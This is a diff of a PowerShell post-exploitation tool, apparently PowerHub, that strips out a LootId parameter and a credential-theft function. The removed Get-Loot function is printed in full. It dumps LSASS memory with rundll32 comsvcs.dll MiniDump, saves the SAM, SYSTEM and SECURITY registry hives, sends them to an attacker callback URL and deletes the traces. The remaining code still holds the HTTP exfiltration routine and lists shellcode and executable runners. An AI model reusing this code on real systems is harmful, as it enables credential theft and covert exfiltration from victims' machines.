@@ -610,10 +610,7 @@ function Send-Bytes {
        [Byte[]]$Body,
 
        [Parameter(Mandatory=$False,Position=1)]
-       [String[]]$FileName,
-
-       [Parameter(Mandatory=$False)]
-       [String] $LootId
+       [String[]]$FileName
     )
 
     if ($FileName) {
@@ -630,7 +627,7 @@ function Send-Bytes {
     $Body = (Encrypt-AES $Body $KEY)
 
     if ("{{transport}}" -match "^https?$") {
-        Send-BytesViaHttp -LootId $LootId $Body $FileName
+        Send-BytesViaHttp $Body $FileName
     }
 }
 
@@ -640,10 +637,7 @@ function Send-BytesViaHttp {
        [Byte[]]$Body,
 
        [Parameter(Mandatory=$False,Position=1)]
-       [String[]]$FileName,
-
-       [Parameter(Mandatory=$False)]
-       [String] $LootId
+       [String[]]$FileName
     )
     $boundary = [System.Guid]::NewGuid().ToString()
     $LF = "`r`n"
@@ -659,7 +653,6 @@ function Send-BytesViaHttp {
 
     $ProgressPreference = 'SilentlyContinue'
     $post_url = "$(${CALLBACK_URL})u?script"
-    if ($LootId) { $post_url += "&loot=$LootId" }
     {{'Write-Debug "POSTing the file to $post_url..."'|debug}}
     $WebRequest = [System.Net.WebRequest]::Create($post_url)
     $WebRequest.Method = "POST"
@@ -714,9 +707,6 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
        [Parameter(Mandatory=$False)]
        [String[]]$Name,
 
-       [Parameter(Mandatory=$false)]
-       [String] $LootId,
-
        [Parameter(Mandatory=$False,ValueFromPipeline=$True)]
        $Stream
     )
@@ -740,7 +730,7 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
             if (-not $Name) {
                 $Name = "{0}_{1}.dat" -f $Env:COMPUTERNAME, ((Get-Date -Format o) -replace ":", "-")
             }
-            Send-Bytes -LootId $LootId $Body $Name
+            Send-Bytes $Body $Name
         } else {
             ForEach ($file in $Files) {
                 {{'Write-Debug "Pushing $File..."'|debug}}
@@ -752,7 +742,7 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
                     $filename = Split-Path $file -leaf
                 }
 
-                Send-Bytes -LootId $LootId $fileBin $filename
+                Send-Bytes $fileBin $filename
 
             }
         }
@@ -854,66 +844,6 @@ Return some basic information about the underlying system
 }
 
 
-function Get-Loot {
-<#
-.SYNOPSIS
-
-Grab credentials from the hard drive and from memory.
-
-Partially based on:
-    PowerSploit Function: Out-Minidump
-    Author: Matthew Graeber (@mattifestation)
-    License: BSD 3-Clause
-#>
-    $LootId = ""
-    1..4 | %{ $LootId += '{0:x}' -f (Get-Random -Max 256) }
-    $SysInfo = Get-SysInfo
-    $SysInfo.IPs = $SysInfo.IPs -Join " "
-    $SysInfo = $SysInfo | ConvertTo-Csv -NoTypeInformation
-
-
-    $SamPath = Join-Path $env:TMP "sam_$($LootId)"
-    $SystemPath = Join-Path $env:TMP "system_$($LootId)"
-    $SecurityPath = Join-Path $env:TMP "security_$($LootId)"
-    $SoftwarePath = Join-Path $env:TMP "software_$($LootId)"
-    $DumpFilePath = $env:TMP
-
-    $Process = Get-Process lsass
-    $ProcessId = $Process.Id
-    $ProcessName = $Process.Name
-    $ProcessHandle = $Process.Handle
-    $ProcessFileName = "$($ProcessName)_$($ProcessId)_$($LootId).dmp"
-    $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName
-
-    try {
-        {{'Write-Debug "Dumping sysinfo..."'|debug}}
-        $SysInfo | PushTo-Hub -Name "sysinfo_$($LootId)" -LootId $LootId
-
-        {{'Write-Debug "Dumping lsass to $ProcessDumpPath..."'|debug}}
-        & rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $ProcessId $ProcessDumpPath full
-        Wait-Process -Id (Get-Process rundll32).id
-        {{'Write-Debug "Sending lsass dump home..."'|debug}}
-        if (Test-Path $ProcessDumpPath) { PushTo-Hub -LootId $LootId $ProcessDumpPath }
-
-        {{'Write-Debug "Dumping Hives..."'|debug}}
-        & reg save HKLM\SAM $SamPath /y
-        & reg save HKLM\SYSTEM $SystemPath /y
-        & reg save HKLM\SECURITY $SecurityPath /y
-        # & reg save HKLM\SOFTWARE $SoftwarePath /y
-
-        {{'Write-Debug "Sending hive dumps home..."'|debug}}
-        Foreach ($f in $SamPath, $SystemPath, $SecurityPath, $SoftwarePath ) {
-            if (Test-Path $f) { PushTo-Hub -LootId $LootId $f }
-        }
-    } finally {
-        {{'Write-Debug "Deleting dumps..."'|debug}}
-        Foreach ($f in $ProcessDumpPath, $SamPath, $SystemPath, $SecurityPath, $SoftwarePath) {
-            try { Remove-Item -Force $f} catch {}
-        }
-    }
-}
-
-
 function Help-PowerHub {
     Write-Host @"
 The following functions are available (some with short aliases):
@@ -922,7 +852,6 @@ The following functions are available (some with short aliases):
   * Get-HubModule (ghm)
   * Update-HubModules (uhm)
   * Get-SysInfo
-  * Get-Loot (glo)
   * Run-Exe (re)
   * Run-DotNETExe (rdne)
   * Run-Shellcode (rsh)
@@ -940,7 +869,6 @@ try { New-Alias -Name lhm -Value Load-HubModule } catch { }
 try { New-Alias -Name ghm -Value Get-HubModule } catch { }
 try { New-Alias -Name lshm -Value List-HubModules } catch { }
 try { New-Alias -Name uhm -Value Update-HubModules } catch { }
-try { New-Alias -Name glo -Value Get-Loot } catch { }
 try { New-Alias -Name re -Value Run-Exe } catch { }
 try { New-Alias -Name rdne -Value Run-DotNETExe } catch { }
 try { New-Alias -Name rsh -Value Run-Shellcode } catch { }
